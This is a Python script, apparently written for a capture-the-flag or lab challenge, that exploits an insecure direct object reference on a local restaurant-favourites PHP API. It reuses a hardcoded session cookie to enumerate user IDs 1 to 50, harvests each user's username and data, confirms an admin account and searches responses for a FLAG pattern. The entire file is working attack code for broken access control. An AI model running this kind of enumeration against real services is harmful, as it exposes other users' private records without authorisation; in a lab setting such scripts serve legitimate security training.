import requests
import json
import re

def enumerate_and_search_flags():
    base_url = "http://127.0.0.1:32825/api/get_favorite_restaurants.php"
    
    # Use session cookie from auth state
    cookies = {
        'PHPSESSID': 'hk4mi61pda6ge5d66s5qjhkil3'
    }
    
    valid_users = []
    users_with_data = []
    admin_user = None
    flag_found = False
    flag_value = None
    
    print(f"[IDOR Enumeration + FLAG Search] Testing user IDs 1-50")
    print(f"Target: {base_url}?userId={{X}}")
    print()
    
    for user_id in range(1, 51):
        url = f"{base_url}?userId={user_id}"
        
        try:
            response = requests.get(url, cookies=cookies, timeout=10)
            
            if response.status_code == 200:
                try:
                    json_data = response.json()
                    valid_users.append(user_id)
                    
                    # Extract username and restaurants
                    username = "N/A"
                    restaurants = []
                    
                    if 'data' in json_data:
                        data = json_data.get('data', {})
                        username = data.get('username', 'N/A')
                        restaurants = data.get('restaurants', [])
                        
                        # Check for admin
                        if user_id == 7 and username == "admin":
                            admin_user = {
                                'user_id': user_id,
                                'username': username,
                                'restaurants': restaurants,
                                'full_data': json_data
                            }
                    
                    # Search for FLAG pattern in entire response
                    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                    if flag_match:
                        flag_found = True
                        flag_value = flag_match.group(0)
                        print(f"[!] FLAG FOUND in User ID {user_id}!")
                        print(f"  Flag: {flag_value}")
                        print(f"  Username: {username}")
                        print(f"  Full Response: {json.dumps(json_data, indent=2)}")
                        print()
                    
                    # Categorize users
                    if restaurants and len(restaurants) > 0:
                        users_with_data.append(user_id)
                        print(f"[USER {user_id}] Username: {username} | Restaurants: {len(restaurants)}")
                    else:
                        print(f"[USER {user_id}] Username: {username} | No restaurants")
                        
                except json.JSONDecodeError:
                    print(f"[ERROR] User ID {user_id} - Non-JSON response")
                    
        except requests.exceptions.RequestException as e:
            print(f"[REQUEST ERROR] User ID {user_id} - {str(e)}")
    
    print()
    print("="*80)
    print("[FINAL SUMMARY]")
    print("="*80)
    print(f"Total valid users found: {len(valid_users)}")
    print(f"Users with restaurant data: {len(users_with_data)}")
    print(f"Valid user IDs: {sorted(valid_users)}")
    print()
    
    if admin_user:
        print(f"[✓] ADMIN CONFIRMED - User ID 7")
        print(f"    Username: '{admin_user['username']}'")
        print(f"    Restaurants: {admin_user['restaurants']}")
        print(f"    Full Data: {json.dumps(admin_user['full_data'], indent=2)}")
        print()
    
    if flag_found:
        print(f"[!] FLAG DISCOVERED: {flag_value}")
        print()
    else:
        print("[✗] No FLAG{} pattern found in any user profile")
        print()
    
    print("="*80)
    
    # Return flag status for verification
    return {
        'flag_found': flag_found,
        'flag_value': flag_value,
        'admin_confirmed': admin_user is not None
    }

if __name__ == "__main__":
    result = enumerate_and_search_flags()
    print(f"\nVerification: {result}")
